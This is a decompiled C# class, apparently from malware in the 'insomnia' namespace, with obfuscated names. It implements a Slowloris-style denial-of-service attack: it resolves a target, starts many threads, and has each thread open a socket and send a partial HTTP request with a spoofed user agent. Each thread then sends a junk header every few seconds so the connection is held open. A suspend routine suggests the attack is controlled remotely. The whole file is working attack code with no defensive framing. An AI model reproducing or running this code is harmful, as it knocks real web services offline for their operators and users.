using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace insomnia;

internal class Class36
{
	private static ThreadStart[] Field9;

	private static Thread[] Field8;

	public static string Field7;

	private static IPEndPoint Field6;

	public static int Field5;

	public static int Field4;

	public static bool Field3 = false;

	public static string[] Field2 = new string[10] { "Mozilla/3.0 ", "Mozilla/3.1 ", "Mozilla/3.6 ", "Mozilla/4.0 ", "Mozilla/4.08 ", "Mozilla/5.0 ", "Opera/9.33 ", "Opera/9.0 ", "Opera/8.90 ", "Opera/9.80 " };

	public static string[] Field1 = new string[28]
	{
		"(compatible; MSIE 6.0; Windows NT)", "(Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9b5) Gecko/2008032619 Firefox/3.0b5", "(Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1 ", "(MobilePhone SCP-5500/US/1.0) NetFront/3.0 MMP/2.0 (compatible; Googlebot/2.1; http://www.google.com/bot.html)", "[en] (WinNT; U)", "(compatible; MSIE 7.0; Windows NT 5.1; bgft) ", "(compatible; MSIE 6.0; Win32)", "(X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01", "(X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801", "(SunOS 5.8 sun4u; U) Opera 5.0 [en]",
		"(compatible; Googlebot/2.1; http://www.google.com/bot.html)  ", "(X11; U; Linux i686; en-US; rv:1.8) Gecko/20051111 Firefox/1.5 BAVM/1.0.0", "(X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8 ", "(Windows; U; Windows NT 6.1; it; rv:1.9.2) Gecko/20100115 Firefox/3.6", "Galeon/1.2.0 (X11; Linux i686; U;) Gecko/20020326", "(Windows NT 5.1; U; en) Presto/2.5.22 Version/10.50", "(Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10", "(X11; Linux x86_64; U; Linux Mint; en) Presto/2.2.15 Version/10.10", "(Macintosh; PPC Mac OS X; U; en) Opera 8.0", "(Windows; U; Windows NT 5.1; en-US; rv:0.9.6) Gecko/20011128",
		"(Windows; U; Windows NT 5.1; en-US) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10", "(iPhone; U; CPU like Mac OS X; en) AppleWebKit/420.1 (KHTML, like Gecko) Version/3.0 Mobile/4A93 Safari/419.3", "(compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET CLR 4.0.20402; MS-RTC LM 8)", "(Windows; U; MSIE 7.0; Windows NT 6.0; en-US)", "(compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", "(compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)", "(compatible; MSIE 6.1; Windows XP)", "(Windows; U; Windows NT 6.1; nl; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3"
	};

	public static string Method6()
	{
		return Field2[Class39.Method12(0, Field2.Length)] + Field1[Class39.Method12(0, Field1.Length)];
	}

	public static string Method5()
	{
		int num = Class39.Method12(0, 10);
		if (num < 5)
		{
			return "GET";
		}
		return "POST";
	}

	public static void Method4()
	{
		try
		{
			Field6 = new IPEndPoint(Dns.GetHostEntry(Field7).AddressList[0], Field4);
		}
		catch
		{
			Field6 = new IPEndPoint(IPAddress.Parse(Field7), Field4);
		}
		Field8 = new Thread[Field5];
		Field9 = new ThreadStart[Field5];
		for (int i = 0; i < Field5; i++)
		{
			Field9[i] = Method2;
			Field8[i] = new Thread(Field9[i]);
			Field8[i].Start();
		}
	}

	public static void Method3()
	{
		for (int i = 0; i < Field5; i++)
		{
			try
			{
				Field8[i].Suspend();
			}
			catch
			{
			}
		}
	}

	public static void Method2()
	{
		Thread.Sleep(Class39.Method12(2000, 10000));
		try
		{
			Method6();
			string format = "{0} {1} HTTP/1.1\r\nHost: {2}\r\nUser-Agent: {3}\r\nContent-Length: {4}\r\n";
			string s = string.Format(format, Method5(), "/?" + Class39.Method12(1, 99999999), Field7, Method6(), Class39.Method12(10, 999));
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			Socket socket = Method1(Field6.Address.ToString(), Field4);
			socket.Send(bytes, bytes.Length, SocketFlags.None);
			while (true)
			{
				Thread.Sleep(Class39.Method12(10000, 15000));
				byte[] bytes2 = Encoding.UTF8.GetBytes("X-a: b\r\n");
				socket.Send(bytes2, bytes2.Length, SocketFlags.None);
			}
		}
		catch
		{
			Method2();
		}
	}

	public static Socket Method1(string A_0, int A_1)
	{
		Socket result = null;
		IPHostEntry iPHostEntry = null;
		iPHostEntry = Dns.GetHostEntry(A_0);
		IPAddress[] addressList = iPHostEntry.AddressList;
		foreach (IPAddress address in addressList)
		{
			IPEndPoint iPEndPoint = new IPEndPoint(address, A_1);
			Socket socket = new Socket(iPEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
			socket.Connect(iPEndPoint);
			if (socket.Connected)
			{
				result = socket;
				break;
			}
		}
		return result;
	}
}
